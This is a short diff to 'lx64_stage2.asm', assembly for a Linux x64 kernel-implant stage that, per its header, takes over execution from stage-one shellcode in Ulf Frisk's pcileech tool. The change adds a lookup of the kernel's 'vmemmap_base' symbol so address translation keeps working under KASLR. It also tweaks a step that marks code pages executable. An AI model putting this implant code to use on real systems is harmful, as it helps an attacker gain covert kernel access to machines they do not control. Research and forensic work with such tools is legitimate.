@@ -1,7 +1,7 @@
 ; lx64_stage2.asm : assembly to receive execution from stage1 shellcode.
 ; Compatible with Linux x64.
 ;
-; (c) Ulf Frisk, 2016
+; (c) Ulf Frisk, 2016, 2017
 ; Author: Ulf Frisk, pcileech@frizk.net
 ;
 
@@ -117,6 +117,7 @@ setup PROC
 	; ----------------------------------------------------
 	; 2: SET CODE PAGE TO EXECUTABLE
 	; ----------------------------------------------------
+	LEA rax, main
 	LEA rdi, str_set_memory_x
 	CALL r14
 	TEST rax, rax
@@ -211,8 +212,22 @@ m_phys_to_virt PROC
 	RET
 m_phys_to_virt ENDP
 
-m_page_to_phys PROC
+m_vmemmap_base PROC
+	LEA rdi, str_vmemmap_base
+	CALL r14
+	TEST rax, rax
+	JZ kaslr_memmap_disable
+	MOV rax, [rax]
+	RET
+	kaslr_memmap_disable:
 	MOV rax, 0ffffea0000000000h
+	RET
+m_vmemmap_base ENDP
+
+m_page_to_phys PROC
+	PUSH rdi
+	CALL m_vmemmap_base
+	POP rdi
 	SUB rdi, rax
 	SHR rdi, 7		; PFN
 	SHL rdi, 12
@@ -261,6 +276,7 @@ str_alloc_pages_current		db 'alloc_pages_current', 0
 str_set_memory_x			db 'set_memory_x', 0
 str_wake_up_process			db 'wake_up_process', 0
 str_page_offset_base		db 'page_offset_base', 0
+str_vmemmap_base			db 'vmemmap_base', 0
 str_pcileech				db 'pcileech', 0
 
 END
